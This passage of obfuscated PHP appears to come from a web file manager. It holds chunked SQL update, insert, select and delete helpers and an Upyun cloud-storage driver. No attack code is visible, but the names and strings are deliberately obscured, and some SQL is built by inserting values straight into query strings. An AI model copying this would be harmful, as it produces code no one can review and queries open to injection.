$‹Ÿİï¢»[456]; $Ï»£›ö = 0; $Ü¡ûüÏ³ = array(); $Ïï‚¤® = count($çéü±Ñ¯); for ($çËÉÙ· = 0; $çËÉÙ· < $Ïï‚¤®; $çËÉÙ·++) { $õ´ÀÛß = $çéü±Ñ¯[$çËÉÙ·]; if (!is_array($õ´ÀÛß) || count($õ´ÀÛß) != 4) { continue; } $¬›ş–»‹ = "\125\x50\104\101\124\105\40\140{$Û´ê­ÓÉ}\x60\x20\x53\105\124\40{$õ´ÀÛß[2]}\x20\75\40\x43\x41\123\105\x20{$õ´ÀÛß[0]}\40\xa"; if ($Ï»£›ö == 0) { $©Õûıé¶ = $¬›ş–»‹; } $Ü¡ûüÏ³[] = $‹Ÿİï¢»[121] . $õ´ÀÛß[1] . $‹Ÿİï¢»[121]; $Ï»£›ö++; $©Õûıé¶ .= "\x20\127\x48\105\116\x20\47{$õ´ÀÛß[1]}\47\40\124\110\105\x4e\40\x27{$õ´ÀÛß[3]}\47\40\12"; if ($Ï»£›ö == $¥Š’¿œ… || $çËÉÙ· == $Ïï‚¤® - 1) { $†§ÈÔÆ = implode($‹Ÿİï¢»[50], $Ü¡ûüÏ³); $©Õûıé¶ .= "\40\105\x4e\104\40\40\x57\110\105\122\105\x20{$õ´ÀÛß[0]}\40\x49\116\x20\x28{$†§ÈÔÆ}\x29\x20"; $this->execute($©Õûıé¶); $Ï»£›ö = 0; $©Õûıé¶ = $¬›ş–»‹; $this->chunkEventCheck(count($Ü¡ûüÏ³)); $Ü¡ûüÏ³ = array(); } } $this->chunkEventSet(); } public function saveAllEach($¢¡Æôñë) { $Â…¡ğ…‡ =& $_SERVER[ÔÕ±ĞšÎ]; $›¬Ş¯ıö = $this->tablePrefix . $this->tableName; foreach ($¢¡Æôñë as $ë‹”äÄş) { if (!is_array($ë‹”äÄş) || count($ë‹”äÄş) != 4) { continue; } $ö·¬Î™ = $ë‹”äÄş[0] . $Â…¡ğ…‡[457] . $ë‹”äÄş[1] . $Â…¡ğ…‡[121]; $™ËäƒØ£ = $ë‹”äÄş[2] . $Â…¡ğ…‡[457] . $ë‹”äÄş[3] . $Â…¡ğ…‡[121]; $Ãõ‹ïğ÷ = "\165\160\144\x61\164\x65\x20{$›¬Ş¯ıö}\40\x73\145\164\x20{$™ËäƒØ£}\x20\x77\x68\x65\162\x65\40{$ö·¬Î™}\73"; $this->execute($Ãõ‹ïğ÷); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¸ñÇíÎ¥ = false, $ÏƒÑ¬ªç = false) { $this->_chunkEvent = $¸ñÇíÎ¥; $this->_chunkEventParam = $ÏƒÑ¬ªç; } private function chunkEventCheck($Ş‹¢Œ¸ó) { if (!$this->_chunkEvent) { return; } $ªµøÔô… = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ªµøÔô…[$_SERVER[ÔÕ±ĞšÎ][458]] = $Ş‹¢Œ¸ó; Hook::trigger($this->_chunkEvent, $ªµøÔô…); } public function addAll($ºŞ£èĞ©, $Ôö†¹ßè = array(), $ùà™¿İÚ = false) { $¾“¨ó¬– =& $_SERVER[ÔÕ±ĞšÎ]; ignore_timeout(); $ñîœÈ– = self::SQL_WHERE_IN_CHUNK; if (empty($ºŞ£èĞ©)) { $this->error = think_lang($¾“¨ó¬–[350]); return !1; } $Ôö†¹ßè = $this->_parseOptions($Ôö†¹ßè); foreach ($ºŞ£èĞ© as $¸¶Ì› => $é·Ùı·˜) { $ºŞ£èĞ©[$¸¶Ì›] = $this->_facade($é·Ùı·˜); $this->_beforeInsert($ºŞ£èĞ©[$¸¶Ì›], $Ôö†¹ßè); } if (method_exists($this->db, $¾“¨ó¬–[351])) { for ($‰ëÉÊİ¸ = 0; $‰ëÉÊİ¸ < count($ºŞ£èĞ©); $‰ëÉÊİ¸ += $ñîœÈ–) { $Ìßœ¦Åó = array_slice($ºŞ£èĞ©, $‰ëÉÊİ¸, $ñîœÈ–); if (!is_array($Ìßœ¦Åó) || count($Ìßœ¦Åó) == 0) { break; } $å³’Ì²Ë = $this->db->insertAll($Ìßœ¦Åó, $Ôö†¹ßè, $ùà™¿İÚ); $this->chunkEventCheck(count($Ìßœ¦Åó)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ºŞ£èĞ© as $¸¶Ì› => $é·Ùı·˜) { $å³’Ì²Ë = $this->db->insert($é·Ùı·˜, $Ôö†¹ßè, $ùà™¿İÚ); } $this->commit(); } if (!1 !== $å³’Ì²Ë) { $†·†ÈéÀ = $this->getLastInsID(); if ($†·†ÈéÀ) { return $†·†ÈéÀ; } } return $å³’Ì²Ë; } public function save($©Ìû¶„‹ = '', $ëÌÖÍğ = array()) { $­ïäœ =& $_SERVER[ÔÕ±ĞšÎ]; $»ËÔé¦Í = self::SQL_WHERE_IN_CHUNK; $Éò©‹²Ê = $this->optionsValue(); $üœæ›Ú = $this->findWhereField($Éò©‹²Ê); if (!$üœæ›Ú) { return parent::save($©Ìû¶„‹, $ëÌÖÍğ); } $åßâáŒû = 0; $ÆŞ™ÒÒ¢ = $Éò©‹²Ê[$­ïäœ[354]][$üœæ›Ú][1]; $ÆŞ™ÒÒ¢ = is_array($ÆŞ™ÒÒ¢) ? $ÆŞ™ÒÒ¢ : array(); $ÁòèáÜ† = count($ÆŞ™ÒÒ¢); for ($¢íŒ²Äğ = 0; $¢íŒ²Äğ < $ÁòèáÜ†; $¢íŒ²Äğ += $»ËÔé¦Í) { $ÌûîÙƒ = array_slice($ÆŞ™ÒÒ¢, $¢íŒ²Äğ, $»ËÔé¦Í); if (!is_array($ÌûîÙƒ) || count($ÌûîÙƒ) == 0) { break; } $Éò©‹²Ê[$­ïäœ[354]][$üœæ›Ú][1] = $ÌûîÙƒ; $this->optionsValue($Éò©‹²Ê); $åßâáŒû += parent::save($©Ìû¶„‹, $ëÌÖÍğ); $this->chunkEventCheck(count($ÌûîÙƒ)); } $this->chunkEventSet(); return $åßâáŒû; } public function add($áÍ°®Øœ = '', $»Ø±œ±ï = array(), $ÅˆûÍÛ = false) { if ($this->addTaskStatus && is_array($áÍ°®Øœ)) { $this->addTaskData[] = $áÍ°®Øœ; return; } return parent::add($áÍ°®Øœ, $»Ø±œ±ï, $ÅˆûÍÛ); } public function parseWhereLike($èçÅ€ ğ, $µØá©ö£ = '', $İÎü¯ôÒ = false, &$ş›æ¼µû = false) { $ã®ôéÕÎ =& $_SERVER[ÔÕ±ĞšÎ]; $“øØÓ‘è = $GLOBALS[$ã®ôéÕÎ[6]][$ã®ôéÕÎ[459]]; if (!$“øØÓ‘è[$ã®ôéÕÎ[460]]) { return $èçÅ€ ğ; } if (!is_array($èçÅ€ ğ)) { return $èçÅ€ ğ; } $Ò…ˆ£· = array(); $Œ¸‡šÒŠ = 0; foreach ($èçÅ€ ğ as $õ½ç¡Ş— => $´”º³î¿) { if (is_array($´”º³î¿) && count($´”º³î¿) == 2 && $´”º³î¿[0] == $ã®ôéÕÎ[461] && is_string($´”º³î¿[1]) && substr($´”º³î¿[1], 0, 1) == $ã®ôéÕÎ[462] && substr($´”º³î¿[1], strlen($´”º³î¿[1]) - 1, 1) == $ã®ôéÕÎ[462]) { $ş›æ¼µû = !0; $ãµ½èÚÊ = is_string($õ½ç¡Ş—) ? $õ½ç¡Ş— : $µØá©ö£; $¿ºœŞÂš = substr($´”º³î¿[1], 1, strlen($´”º³î¿[1]) - 2); $¿ºœŞÂš = $this->db->escapeString($¿ºœŞÂš); if (!strpos($ãµ½èÚÊ, $ã®ôéÕÎ[10])) { $ãµ½èÚÊ = $ã®ôéÕÎ[463] . $ãµ½èÚÊ . $ã®ôéÕÎ[463]; } $‚òÏÖš = $ã®ôéÕÎ[222] . $¿ºœŞÂš . $ã®ôéÕÎ[222]; $¿ºœŞÂš = str_replace(array($ã®ôéÕÎ[10], $ã®ôéÕÎ[464], $ã®ôéÕÎ[11]), $ã®ôéÕÎ[465], $¿ºœŞÂš); if ($“øØÓ‘è[$ã®ôéÕÎ[466]]) { $‚òÏÖš = $ã®ôéÕÎ[467] . $¿ºœŞÂš . $ã®ôéÕÎ[468]; if ($“øØÓ‘è[$ã®ôéÕÎ[469]]) { $‚òÏÖš = $ã®ôéÕÎ[468] . $¿ºœŞÂš . $ã®ôéÕÎ[467]; } } $Ò…ˆ£·[$Œ¸‡šÒŠ] = $ã®ôéÕÎ[470] . $ãµ½èÚÊ . $ã®ôéÕÎ[471] . $‚òÏÖš . $ã®ôéÕÎ[472]; $Œ¸‡šÒŠ++; continue; } if (is_array($´”º³î¿)) { $µØá©ö£ = is_string($õ½ç¡Ş—) ? $õ½ç¡Ş— : $µØá©ö£; $´”º³î¿ = $this->parseWhereLike($´”º³î¿, $µØá©ö£, !0, $ş›æ¼µû); } if (is_numeric($õ½ç¡Ş—)) { $Ò…ˆ£·[$Œ¸‡šÒŠ] = $´”º³î¿; $Œ¸‡šÒŠ++; } else { $Ò…ˆ£·[$õ½ç¡Ş—] = $´”º³î¿; } } if ($ş›æ¼µû && !$İÎü¯ôÒ) { } return $Ò…ˆ£·; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ÄŞàÄÙ = array()) { $æì›´ã =& $_SERVER[ÔÕ±ĞšÎ]; $ò€ÍØÅ = self::SQL_WHERE_IN_CHUNK; $³±Ã«Ê = $this->optionsValue(); $ü˜‚¤Ê™ = $this->findWhereField($³±Ã«Ê); if (!$ü˜‚¤Ê™ || isset($³±Ã«Ê[$æì›´ã[369]]) || isset($³±Ã«Ê[$æì›´ã[430]])) { return parent::select($ÄŞàÄÙ); } $…·°£˜È = $³±Ã«Ê[$æì›´ã[354]][$ü˜‚¤Ê™][1]; $…·°£˜È = is_array($…·°£˜È) ? $…·°£˜È : array(); $Û—¢Ê‘Ú = null; for ($Èî«àËÏ = 0; $Èî«àËÏ < count($…·°£˜È); $Èî«àËÏ += $ò€ÍØÅ) { $¤øÑ¦ı = array_slice($…·°£˜È, $Èî«àËÏ, $ò€ÍØÅ); if (!is_array($¤øÑ¦ı) || count($¤øÑ¦ı) == 0) { break; } $³±Ã«Ê[$æì›´ã[354]][$ü˜‚¤Ê™][1] = $¤øÑ¦ı; $this->optionsValue($³±Ã«Ê); $á¥Ğæ¤­ = parent::select($ÄŞàÄÙ); if (!$á¥Ğæ¤­) { continue; } $Û—¢Ê‘Ú = is_array($Û—¢Ê‘Ú) ? $Û—¢Ê‘Ú : array(); $Û—¢Ê‘Ú = array_merge($Û—¢Ê‘Ú, $á¥Ğæ¤­); } return $Û—¢Ê‘Ú; } public function delete($ÓÙ¼ÉÌÂ = array()) { $¶æ÷¨†á =& $_SERVER[ÔÕ±ĞšÎ]; $§èº–åŒ = self::SQL_WHERE_IN_CHUNK; $™ÛšÒÁ… = $this->optionsValue(); $­î…ûÚ = $this->findWhereField($™ÛšÒÁ…); if (!$­î…ûÚ) { return parent::delete($ÓÙ¼ÉÌÂ); } $†Ìèî¸Â = 0; $§×Æ˜œË = $™ÛšÒÁ…[$¶æ÷¨†á[354]][$­î…ûÚ][1]; $§×Æ˜œË = is_array($§×Æ˜œË) ? $§×Æ˜œË : array(); for ($”’¶ãá = 0; $”’¶ãá < count($§×Æ˜œË); $”’¶ãá += $§èº–åŒ) { $ÃçŸö®¸ = array_slice($§×Æ˜œË, $”’¶ãá, $§èº–åŒ); if (!is_array($ÃçŸö®¸) || count($ÃçŸö®¸) == 0) { break; } $™ÛšÒÁ…[$¶æ÷¨†á[354]][$­î…ûÚ][1] = $ÃçŸö®¸; $this->optionsValue($™ÛšÒÁ…); $†Ìèî¸Â += parent::delete($ÓÙ¼ÉÌÂ); } return $†Ìèî¸Â; } private function findWhereField($â±Ãï…) { $ôËáÆøÔ =& $_SERVER[ÔÕ±ĞšÎ]; $Ï§Úì»  = self::SQL_WHERE_IN_CHUNK; if (!is_array($â±Ãï…) || !is_array($â±Ãï…[$ôËáÆøÔ[354]])) { return !1; } foreach ($â±Ãï…[$ôËáÆøÔ[354]] as $´±âŞĞ => $ßÃÊíà) { if (is_array($ßÃÊíà) && isset($ßÃÊíà[0]) && is_string($ßÃÊíà[0]) && strtolower($ßÃÊíà[0]) == $ôËáÆøÔ[7] && is_array($ßÃÊíà[1]) && count($ßÃÊíà[1]) > $Ï§Úì» ) { ignore_timeout(); return $´±âŞĞ; } } return !1; } public function setMasterDB($¿…Àœœõ = true) { think_config($_SERVER[ÔÕ±ĞšÎ][473], $¿…Àœœõ); } } goto C£´ªîî¾; D×İùŠ·Àö: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\x3a\x2f\x2f\x76\x30\56\x61\x70\151\x2e\x75\x70\x79\x75\156\56\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¤¾ˆé§™) { parent::__construct(); $this->_init($¤¾ˆé§™); } public function _init($ÇåôÁúŞ) { $ù§ ØÜ =& $_SERVER[ÔÕ±ĞšÎ]; foreach ($ÇåôÁúŞ as $ûì§«Ä¹ => $Ë•Ïò‚¯) { if (isset($this->{$ûì§«Ä¹})) { $this->{$ûì§«Ä¹} = $Ë•Ïò‚¯; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ù§ ØÜ[1548] . LNG($ù§ ØÜ[1467])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($³Åäæ·Ÿ, $ÅŒÃÂä¹ = "\x47\x45\x54") { $í•§Ù‘¦ =& $_SERVER[ÔÕ±ĞšÎ]; $Ö¥°‹ƒ„ = gmdate($í•§Ù‘¦[1496]); $à‰ş¢·Ë = base64_encode(hash_hmac($í•§Ù‘¦[1549], "{$ÅŒÃÂä¹}\46{$³Åäæ·Ÿ}\46{$Ö¥°‹ƒ„}", md5("{$this->userpass}"), !0)); $Œääˆï¥ = array("\x41\165\x74\x68\157\x72\x69\x7a\141\x74\151\157\x6e\x3a\x55\120\131\125\x4e\40{$this->username}\72{$à‰ş¢·Ë}", "\104\x61\164\x65\x3a{$Ö¥°‹ƒ„}"); return $Œääˆï¥; } public function ussRequest($ÌöË—ì–, $¬õš¯Èá = "\x47\105\x54", $Ì”àåŠµ = false, $—êåä†Æ = false, $½º€í»ä = false) { $’Ø¾å° =& $_SERVER[ÔÕ±ĞšÎ]; $ÌöË—ì– = trim($ÌöË—ì–, $’Ø¾å°[8]); $‘‘¼ßÙ‘ = "\57{$this->bucket}\x2f" . rawurlencode($ÌöË—ì–); $ÒØı±¿û = $this->ussHeaders($‘‘¼ßÙ‘, $¬õš¯Èá); if ($—êåä†Æ) { $ÒØı±¿û = array_merge($ÒØı±¿û, $—êåä†Æ); } $¦ğÆ¨èÒ = url_request($this->endpoint . $‘‘¼ßÙ‘, $¬õš¯Èá, $Ì”àåŠµ, $ÒØı±¿û, $½º€í»ä); if (!$¦ğÆ¨èÒ) { $ª¾íŞ©ù = LNG($’Ø¾å°[1550]); $this->writeLog($ª¾íŞ©ù); return array($’Ø¾å°[1299] => !1, $’Ø¾å°[1289] => $ª¾íŞ©ù); } if (strtolower($¬õš¯Èá) == $’Ø¾å°[229] || in_array($¦ğÆ¨èÒ[$’Ø¾å°[1299]], array($’Ø¾å°[263], $’Ø¾å°[1551]))) { $Ì”àåŠµ = $¦ğÆ¨èÒ[$’Ø¾å°[1552]]; if (!$¦ğÆ¨èÒ[$’Ø¾å°[824]]) { $Ì”àåŠµ = isset($Ì”àåŠµ[0]) ? $Ì”àåŠµ[0] : $’Ø¾å°[12]; } } else { $Ì”àåŠµ = json_decode($¦ğÆ¨èÒ[$’Ø¾å°[1289]], !0); if (!$Ì”àåŠµ) { $Ì”àåŠµ = $¦ğÆ¨èÒ[$’Ø¾å°[1289]]; } else { if (!$¦ğÆ¨èÒ[$’Ø¾å°[824]] && isset($Ì”àåŠµ[$’Ø¾å°[1553]])) { $Ì”àåŠµ = $Ì”àåŠµ[$’Ø¾å°[1553]]; } } } if (!$¦ğÆ¨èÒ[$’Ø¾å°[824]]) { $this->writeLog($this->__errorMessage($Ì”àåŠµ)); } return array($’Ø¾å°[1299] => $¦ğÆ¨èÒ[$’Ø¾å°[824]], $’Ø¾å°[1289] => $Ì”àåŠµ); } private function __errorMessage($ŞôµŞé) { $Ï…ßë =& $_SERVER[ÔÕ±ĞšÎ]; if (!$ŞôµŞé) { return $Ï…ßë[12]; } static $íÔÇı›´ = null; if (!$íÔÇı›´) { $íÔÇı›´ = I18n::getType(); } if ($íÔÇı›´ != $Ï…ßë[1506]) { return $ŞôµŞé; } $ùÇ·… = array($Ï…ßë[1554] => $Ï…ßë[1555], $Ï…ßë[1556] => $Ï…ßë[1557], $Ï…ßë[1558] => $Ï…ßë[1557], $Ï…ßë[1559] => $Ï…ßë[1560], $Ï…ßë[1561] => $Ï…ßë[1562], $Ï…ßë[1563] => $Ï…ßë[1564], $Ï…ßë[1565] => $Ï…ßë[1566]); return isset($ùÇ·…[$ŞôµŞé]) ? $ùÇ·…[$ŞôµŞé] : $ŞôµŞé; } public function mkfile($Ü‡½ø†, $üç¸€ì = '', $ÔÔÆ×Úµ = REPEAT_RENAME) { if ($this->setContent($Ü‡½ø†, $üç¸€ì)) { return $this->getPathOuter($Ü‡½ø†); } return !1; } public function mkdir($…ŸÅğ²­, $í„æÒ¸‘ = REPEAT_SKIP) { $÷•Ó¢Ä =& $_SERVER[ÔÕ±ĞšÎ]; $½¹°‰¥ª = trim($…ŸÅğ²­, $÷•Ó¢Ä[8]); if ($this->_isFolder($½¹°‰¥ª)) { return $this->getPathOuter($½¹°‰¥ª); } $ØØ¤¥ = array($÷•Ó¢Ä[1567]); $ş¿Ê“êØ = $this->ussRequest($½¹°‰¥ª, $÷•Ó¢Ä[290], !1, $ØØ¤¥); return $ş¿Ê“êØ[$÷•Ó¢Ä[1299]] ? $this->getPathOuter($½¹°‰¥ª) : !1; } public function copyFile($™È¢­øŠ, $ïéùİÎ‹) { $•Ô”ç©è =& $_SERVER[ÔÕ±ĞšÎ]; $ÃºŒÑ¢ = array($•Ô”ç©è[1568] . "\57{$this->bucket}\x2f{$™È¢­øŠ}", $•Ô”ç©è[1569]); $Ï‡å­„á = $this->ussRequest($ïéùİÎ‹, $•Ô”ç©è[255], !1, $ÃºŒÑ¢); return $Ï‡å­„á[$•Ô”ç©è[1299]] ? !0 : $this->getPathOuter($ïéùİÎ‹); } public function moveFile($ğ«Íí€„, $ÛÃô¡ƒ) { $á»‰Ú¿ =& $_SERVER[ÔÕ±ĞšÎ]; $§Åš”ó¹ = array($á»‰Ú¿[1570] . "\x2f{$this->bucket}\57{$ğ«Íí€„}", $á»‰Ú¿[1569]); $·²²Œ¬« = $this->ussRequest($ÛÃô¡ƒ, $á»‰Ú¿[255], !1, $§Åš”ó¹); return $·²²Œ¬«[$á»‰Ú¿[1299]] ? !0 : $this->getPathOuter($ÛÃô¡ƒ); } public function delFile($©ÄšƒƒÇ) { $ÜÇÕÂ— =& $_SERVER[ÔÕ±ĞšÎ]; $¥ëı¼£½ = $this->ussRequest($©ÄšƒƒÇ, $ÜÇÕÂ—[1571]); return $¥ëı¼£½[$ÜÇÕÂ—[1299]] ? !0 : !1; } public function delFolder($…¯¦Ÿ²) { $ù‰‘ôû‹ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->exist($…¯¦Ÿ²)) { return !0; } $this->listItemCache = !1; $¶ä•ø½­ = $½“Ô Éù = array(); $this->fileList($…¯¦Ÿ², $¶ä•ø½­, $½“Ô Éù, !0); $this->listItemCache = !0; foreach ($½“Ô Éù as $„Øûİ¯Ş) { $˜ÏıàÇ = $this->ussRequest($„Øûİ¯Ş[$ù‰‘ôû‹[32]], $ù‰‘ôû‹[1571]); if (!$˜ÏıàÇ[$ù‰‘ôû‹[1299]]) { return !1; } } usort($¶ä•ø½­, function ($È‚˜±ÅÊ, $ğÀ²ÅÖ¹) { $°ÅÀñ¶ç =& $_SERVER[ÔÕ±ĞšÎ]; return substr_count($ğÀ²ÅÖ¹, $°ÅÀñ¶ç[8]) - substr_count($È‚˜±ÅÊ, $°ÅÀñ¶ç[8]); }); foreach ($¶ä•ø½­ as $ÌŒîıå») { $˜ÏıàÇ = $this->ussRequest($ÌŒîıå», $ù‰‘ôû‹[1571]); if (!$˜ÏıàÇ[$ù‰‘ôû‹[1299]]) { return !1; } } $˜ÏıàÇ = $this->ussRequest($…¯¦Ÿ², $ù‰‘ôû‹[1571]); return $˜ÏıàÇ[$ù‰‘ôû‹[1299]]; } public function rename($»ŸËÅ¦Ü, $ù¸Š§İ£) { if ($this->isFile($»ŸËÅ¦Ü)) { $ù¸Š§İ£ = get_path_father($»ŸËÅ¦Ü) . $ù¸Š§İ£; return $this->moveFile($»ŸËÅ¦Ü, $ù¸Š§İ£); } return $this->renameObject($»ŸËÅ¦Ü, $ù¸Š§İ£); } public function fileInfo($–öñÈ£©, $‡’ƒ—È¾ = false, $ºˆış×Û = array()) { $¦”½Û¿Ï =& $_SERVER[ÔÕ±ĞšÎ]; $ˆ¹À­£ù = array($¦”½Û¿Ï[32] => $this->pathThis($–öñÈ£©), $¦”½Û¿Ï[87] => $this->getPathOuter($¦”½Û¿Ï[8] . $–öñÈ£©), $¦”½Û¿Ï[33] => $¦”½Û¿Ï[232], $¦”½Û¿Ï[79] => isset($ºˆış×Û[$¦”½Û¿Ï[79]]) ? $ºˆış×Û[$¦”½Û¿Ï[79]] : 0, $¦”½Û¿Ï[169] => $this->ext($–öñÈ£©)); if ($‡’ƒ—È¾) { return $ˆ¹À­£ù; } $ˆ¹À­£ù[$¦”½Û¿Ï[233]] = $ˆ¹À­£ù[$¦”½Û¿Ï[88]] = 0; $ˆ¹À­£ù[$¦”½Û¿Ï[234]] = $ˆ¹À­£ù[$¦”½Û¿Ï[235]] = !0; if (empty($ºˆış×Û)) { $ºˆış×Û = $this->objectMeta($–öñÈ£©); if (!$ºˆış×Û) { return $ˆ¹À­£ù; } } $ˆ¹À­£ù[$¦”½Û¿Ï[233]] = intval($ºˆış×Û[$¦”½Û¿Ï[1572]]); $ˆ¹À­£ù[$¦”½Û¿Ï[88]] = intval($ºˆış×Û[$¦”½Û¿Ï[1573]]); $ˆ¹À­£ù[$¦”½Û¿Ï[79]] = $ºˆış×Û[$¦”½Û¿Ï[79]]; return $ˆ¹À­£ù; } public function folderInfo($¯Õ´€¢›, $œ÷ÕêŠŞ = false) { $é¢¯–ÈÁ =& $_SERVER[ÔÕ±ĞšÎ]; $ÉşË™¾Ú = array($é¢¯–ÈÁ[32] => $this->pathThis($¯Õ´€¢›), $é¢¯–ÈÁ[87] => $this->getPathOuter($é¢¯–ÈÁ[8] . $¯Õ´€¢›), $é¢¯–ÈÁ[33] => $é¢¯–ÈÁ[78]); if ($œ÷ÕêŠŞ) { return $ÉşË™¾Ú; } $ÉşË™¾Ú[$é¢¯–ÈÁ[233]] = $ÉşË™¾Ú[$é¢¯–ÈÁ[88]] = 0; $ÉşË™¾Ú[$é¢¯–ÈÁ[234]] = $ÉşË™¾Ú[$é¢¯–ÈÁ[235]] = !0; if (empty($á‘ß¨ş)) { $á‘ß¨ş = $this->objectMeta($¯Õ´€¢›); if (!$á‘ß¨ş) { return $ÉşË™¾Ú; } } $ÉşË™¾Ú[$é¢¯–ÈÁ[233]] = intval($á‘ß¨ş[$é¢¯–ÈÁ[1572]]); $ÉşË™¾Ú[$é¢¯–ÈÁ[88]] = intval($á‘ß¨ş[$é¢¯–ÈÁ[1573]]); return $ÉşË™¾Ú; } private function listObjs($İêË“Õ‰, $²Ö‹óó = 0, $ù„ ´Ş¢ = 1000) { $ŒúØÌß… =& $_SERVER[ÔÕ±ĞšÎ]; $¡ÆÅ÷éñ = array($ŒúØÌß…[1574], $ŒúØÌß…[1575] . $ù„ ´Ş¢); if ($²Ö‹óó) { $¡ÆÅ÷éñ[] = $ŒúØÌß…[1576] . $²Ö‹óó; } $‘ÏÎ‚› = $this->ussRequest($İêË“Õ‰, $ŒúØÌß…[1498], !1, $¡ÆÅ÷éñ); return !$‘ÏÎ‚›[$ŒúØÌß…[1299]] ? !1 : $‘ÏÎ‚›[$ŒúØÌß…[1289]]; } private function fileList($‡€Ğª›µ, &$öäÃİöû, &$ÌÅ–Ëèı, $Â³Ááóœ = false) { $½ü˜œëŒ =& $_SERVER[ÔÕ±ĞšÎ]; $§·ƒÆÃ« = $½ü˜œëŒ[12]; $ÆŞİÚ•Ï = 1000; $îè¤• = rtrim($‡€Ğª›µ, $½ü˜œëŒ[8]) . $½ü˜œëŒ[8]; while (!0) { check_abort(); $µôÅµ“ê = $this->listObjs($‡€Ğª›µ, $§·ƒÆÃ«, $ÆŞİÚ•Ï); if (!$µôÅµ“ê) { return !1; } $§·ƒÆÃ« = isset($µôÅµ“ê[$½ü˜œëŒ[1577]]) ? $µôÅµ“ê[$½ü˜œëŒ[1577]] : $½ü˜œëŒ[12]; $ìŒ­®·‰ = isset($µôÅµ“ê[$½ü˜œëŒ[1578]]) ? $µôÅµ“ê[$½ü˜œëŒ[1578]] : array(); foreach ($ìŒ­®·‰ as $Ôµ¾áô«) { $÷óğ™³Ô = $Ôµ¾áô«[$½ü˜œëŒ[33]] == $½ü˜œëŒ[78] ? !0 : !1; $êÂç¶ä„ = ltrim($îè¤• . $Ôµ¾áô«[$½ü˜œëŒ[32]], $½ü˜œëŒ[8]) . ($÷óğ™³Ô ? $½ü˜œëŒ[8] : $½ü˜œëŒ[12]); $ÅÌºƒğæ = array($½ü˜œëŒ[32] => $êÂç¶ä„, $½ü˜œëŒ[33] => $÷óğ™³Ô ? $½ü˜œëŒ[78] : $½ü˜œëŒ[232], $½ü˜œëŒ[79] => $Ôµ¾áô«[$½ü˜œëŒ[414]], $½ü˜œëŒ[1573] => $Ôµ¾áô«[$½ü˜œëŒ[1579]]); $this->cacheMethodInfoSet($êÂç¶ä„, $÷óğ™³Ô, $ÅÌºƒğæ); if ($÷óğ™³Ô) { $öäÃİöû[] = $êÂç¶ä„; if ($Â³Ááóœ) { $this->fileList($êÂç¶ä„, $öäÃİöû, $ÌÅ–Ëèı, $Â³Ááóœ); } continue; } $ÌÅ–Ëèı[] = $ÅÌºƒğæ; } if (count($ìŒ­®·‰) < $ÆŞİÚ•Ï) { break; } } $this->cacheMethodInfoSet($‡€Ğª›µ, !0); } public function listPath($«ÍÙªî“, $ƒÓÎ¾¬ = false) { $ê§ˆÂãÁ =& $_SERVER[ÔÕ±ĞšÎ]; $ª©²âÎ‡ = $–øÄÒô = array(); $this->fileList($«ÍÙªî“, $ª©²âÎ‡, $–øÄÒô); foreach ($ª©²âÎ‡ as $¾ëú’İ† => $¡İÎ¿Á¡) { $ª©²âÎ‡[$¾ëú’İ†] = $this->folderInfo($¡İÎ¿Á¡, $ƒÓÎ¾¬); } foreach ($–øÄÒô as $¾ëú’İ† => $¡İÎ¿Á¡) { $–øÄÒô[$¾ëú’İ†] = $this->fileInfo($¡İÎ¿Á¡[$ê§ˆÂãÁ[32]], $ƒÓÎ¾¬, $¡İÎ¿Á¡); } return array($ê§ˆÂãÁ[85] => $ª©²âÎ‡, $ê§ˆÂãÁ[86] => $–øÄÒô); } public function has($ç×åŞ²Ô, $ŸæøÌ¦ò = false, $Éü¯Ê‹Ö = true) { $ñûà÷ =& $_SERVER[ÔÕ±ĞšÎ]; $ÁàÚÓƒ” = $ñûà÷[12]; $ºŸŒàå­ = 500; $Ú–ÅîÊº = 0; $Æüõ¬± = 0; $ËëŠîÜ™ = rtrim($ç×åŞ²Ô, $ñûà÷[8]) . $ñûà÷[8]; while (!0) { check_abort(); $ó¬İëÊ = $this->listObjs($ç×åŞ²Ô, $ÁàÚÓƒ”, $ºŸŒàå­); if (!$ó¬İëÊ) { return !1; } $ÁàÚÓƒ” = isset($ó¬İëÊ[$ñûà÷[1577]]) ? $ó¬İëÊ[$ñûà÷[1577]] : $ñûà÷[12]; $ñ½Ù«îæ = isset($ó¬İëÊ[$ñûà÷[1578]]) ? $ó¬İëÊ[$ñûà÷[1578]] : array(); if (empty($ñ½Ù«îæ)) { break; } $Ğ­ÑÜ‰ = array_filter($ñ½Ù«îæ, function ($Ñ°•¶Œî) { $üÕ¹Ùü˜ =& $_SERVER[ÔÕ±ĞšÎ]; return $Ñ°•¶Œî[$üÕ¹Ùü˜[33]] == $üÕ¹Ùü˜[78]; }); $—Şééñ = count($ñ½Ù«îæ); $Ğ­ÑÜ‰ = count($Ğ­ÑÜ‰); $Ë…§½òù = $—Şééñ - $Ğ­ÑÜ‰; if ($ŸæøÌ¦ò) { $Æüõ¬± += $Ğ­ÑÜ‰; $Ú–ÅîÊº += $Ë…§½òù; if ($—Şééñ < $ºŸŒàå­) { break; } continue; } if ($Éü¯Ê‹Ö) { if ($Ë…§½òù) { return !0; } } else { if ($Ğ­ÑÜ‰) { return !0; } } if ($—Şééñ < $ºŸŒàå­) { break; } } if ($ŸæøÌ¦ò) { return array($ñûà÷[241] => $Ú–ÅîÊº, $ñûà÷[242] => $Æüõ¬±); } return !1; } public function listAll($êè¹Ç) { $Á²ÚöÊœ =& $_SERVER[ÔÕ±ĞšÎ]; $ã‰ÔßÒ¢ = $ôÊµı = array(); $this->fileList($êè¹Ç, $ã‰ÔßÒ¢, $ôÊµı, !0); $Şó‰­– = array_to_keyvalue($ôÊµı, $Á²ÚöÊœ[32]); foreach ($ã‰ÔßÒ¢ as $ÑƒõÂŞ•) { if 